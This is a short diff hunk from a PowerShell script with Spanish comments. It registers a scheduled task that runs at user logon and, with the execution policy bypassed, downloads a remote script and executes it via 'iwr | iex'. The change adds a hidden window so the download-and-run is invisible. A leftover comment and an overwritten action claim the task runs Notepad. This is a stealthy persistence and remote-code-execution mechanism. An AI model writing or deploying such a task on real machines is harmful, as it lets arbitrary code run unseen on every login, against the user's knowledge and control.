@@ -126,7 +126,7 @@ function RegisterOnceScheduledTask {
         # Definir la acción (ejecutar Notepad)
         $accion = New-ScheduledTaskAction -Execute "notepad.exe" -WorkingDirectory "$env:USERPROFILE"
         $accion = New-ScheduledTaskAction -Execute "powershell.exe" `
-            -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"try { `$url='$scriptUrl'; iwr `$url -UseBasicParsing | iex } catch { Write-Error $_ }`"" -WorkingDirectory "$env:USERPROFILE"
+            -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"try { `$url='$scriptUrl'; iwr `$url -UseBasicParsing | iex } catch { Write-Error $_ }`"" -WorkingDirectory "$env:USERPROFILE"
 
         $desencadenador = New-ScheduledTaskTrigger -AtLogOn 
         $desencadenador.UserId = "$env:USERDOMAIN\$env:USERNAME"  
